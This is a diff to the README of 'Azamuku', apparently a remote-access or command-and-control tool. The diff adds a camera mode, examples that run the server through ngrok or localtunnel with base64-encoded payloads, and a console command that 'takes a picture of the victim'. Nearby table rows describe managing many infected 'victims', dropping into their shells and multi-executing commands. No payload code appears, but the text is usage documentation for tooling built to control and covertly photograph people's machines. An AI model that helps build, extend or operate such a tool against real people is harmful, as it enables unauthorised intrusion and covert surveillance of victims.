@@ -122,6 +122,7 @@ Start the server using `python3 azamuku.py`. You can configure it using the foll
 | `-lt`, `--localtunnel` | Use localtunnel for tunneling                            | `False`        |
 | `-ng`, `--ngrok`       | Use ngrok for tunneling                                  | `False`        |
 | `-b64`, `--base64`     | Use base64 encoding for payload                          | `False`        |
+| `-c`, `--camera`       | Enable camera mode                                       | `False`        |
 
 **Examples:**
 
@@ -137,6 +138,18 @@ python3 azamuku.py --ngrok
 
 # Start with ngrok tunneling and base64 encoding
 python3 azamuku.py --ngrok --base64
+
+# Start with ngrok tunneling and camera mode
+python3 azamuku.py --ngrok --camera
+
+# Start with localtunnel tunneling
+python3 azamuku.py --localtunnel
+
+# Start with localtunnel tunneling and base64 encoding
+python3 azamuku.py --localtunnel --base64
+
+# Start with localtunnel tunneling and camera mode
+python3 azamuku.py --localtunnel --camera
 ```
 
 ### Advanced Usage Tips
@@ -177,6 +190,7 @@ Once the server is running, you can use the following commands in the Azamuku co
 | `allow`         | `<uid>` or `<filename>` | Authorizes a specific UID or imports a list of UIDs from a file. Allowed UIDs can connect back to the server. <br> **Example:** `allow 12345` or `allow old_sessions.txt`                                   |
 | `grab`          | None                    | Toggles "grabbing" mode. When enabled, the server will accept connections from ANY UID, even if not explicitly authorized (useful for reconnecting lost sessions).                                          |
 | `export`        | `<filename>`            | Saves the current list of authorized UIDs to a file. <br> **Example:** `export sessions.txt`                                                                                                                |
+| `camera`        | `<uid>`                 | Takes a picture of the victim. <br> **Example:** `camera 12345`                                                                                                                                             |
 | `wait`          | None                    | Waits for the next new connection and automatically drops you into a shell for that victim.                                                                                                                 |
 | `rm`            | `<uid>`                 | Removes a victim from the session list and de-authorizes their UID. <br> **Example:** `rm 12345`                                                                                                            |
 | `select`        | `<uid>` or `*`          | Toggles selection of a UID for multi-execution. Use `*` to select/deselect all currently connected victims. <br> **Example:** `select 12345` or `select *`                                                  |
@@ -188,3 +202,4 @@ Once the server is running, you can use the following commands in the Azamuku co
 
 - **No True Interactive Shells:** Since this is HTTP-based, it is not a true interactive shell (like SSH or Netcat). It polls for commands.
 - **Latency:** There might be a delay depending on the beacon interval.
+- **Camera:** The camera feature is working but still more improvements.
